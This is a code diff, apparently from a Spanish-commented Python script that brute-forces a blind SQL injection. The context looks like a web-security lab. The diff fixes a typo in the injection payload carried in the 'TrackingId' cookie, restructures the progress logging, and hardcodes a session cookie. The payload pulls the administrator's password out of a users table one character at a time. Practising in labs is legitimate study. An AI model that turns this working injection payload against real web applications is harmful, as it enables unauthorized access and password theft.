@@ -158,8 +158,6 @@ def def_handler(sig, frame):
 
     print(colored(f"\n\n[!] Saliendo...\n", 'red'))
 
-    p1.failure("Ataque de fuerza bruta detenido")
-
     sys.exit(1)
 
   
@@ -173,11 +171,14 @@ signal.signal(signal.SIGINT, def_handler)
 characters = string.ascii_lowercase + string.digits
 
   
+
+p1 = log.progress("SQLI")
+
   
 
 def makeSQLI():
 
-    p1 = log.progress("SQLI")
+  
 
     p1.status("Inciando ataque de fuerza bruta")
 
@@ -201,7 +202,7 @@ def makeSQLI():
 
             cookies = {
 
-                'TrackingId': f"R1pyTZ1RPBPzqwit' and (selectT substring(password,{position},1) from users where username='administrator')='{character}'-- -",
+                'TrackingId': f"R1pyTZ1RPBPzqwit' and (select substring(password,{position},1) from users where username='administrator')='{character}'-- -",
 
                 'session': "bO9nmH6cIfC3uHP2ruhTrRlMkF955bLl"
 
